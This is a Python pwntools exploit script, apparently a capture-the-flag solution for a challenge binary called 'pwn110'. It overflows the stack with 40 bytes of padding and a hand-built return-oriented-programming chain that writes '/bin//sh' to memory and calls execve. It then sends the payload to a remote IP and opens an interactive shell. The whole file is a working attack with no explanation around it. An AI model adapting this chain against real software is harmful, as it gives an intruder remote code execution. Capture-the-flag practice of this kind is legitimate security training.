from pwn import *
from struct import pack

elf = context.binary = ELF("./pwn110")

# Padding goes here
p = b'a'*40

p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012d3) # syscall

pr = remote('10.10.206.177', 9010)
pr.sendline(p)

pr.interactive()
